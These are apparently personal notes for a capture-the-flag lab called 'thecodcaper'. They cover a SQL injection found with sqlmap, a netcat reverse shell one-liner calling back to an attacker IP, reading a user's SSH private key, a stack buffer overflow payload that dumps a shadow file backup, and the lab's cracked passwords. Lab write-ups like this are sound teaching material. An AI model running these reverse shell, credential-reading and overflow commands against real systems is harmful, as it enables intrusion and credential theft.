# thecodcaper

export IP=10.10.78.11

## Creds

sql -> debian-sys-maint:root
pingudad:secretpass
pingu:pinguapingu
papa:postman
root:love2fish

## Nmap

22 ssh
80 http


## http

/administrator.php

`username` field is sql injectable

sqlmap found credentials for debian-sys-maint:root

command execution

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.4.99 9999 >/tmp/f`

reverse shell created

find password `find / -type f -user www-data 2>/dev/null`
find ssh key `cat /home/pingu/.ssh/id_rsa`

## LinEnum

no sudo

### suid

/opt/secret/root

### sudo bug
Sudo version 1.8.16 - CVE-2017-1000367

## Disassemble /op/secret/root

Got to learn more about this. Gist is pwndbg is installed with gdb. That 
makes things easier

We've got source code

`gdb /opt/root` to start analyzing
`r < <(cyclic 50)` to provide a calculateable string to the program
We got a sigint exception
EIP is stack pointer
The program crashes at 0x6161616c
`cyclic -l 0x6161616c` will find the position in that calculatable string
it returns 44

### exploit

find position of shell function in `/opt/secret/root`

Source said that that will print the backup of /etc/shadow

`disassemble shell` in gdb will print the shell function
first line will give memory addres of 0x080484cb

`python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root` will 
input 44 chars and then the address of the shell function into `/opt/secret/root`

using this will cat the shadow backup file

## Hashing

Having the shadow file lets find the passwords in that. The password of `papa` 
is `postman`. The password of root is `love2fish`
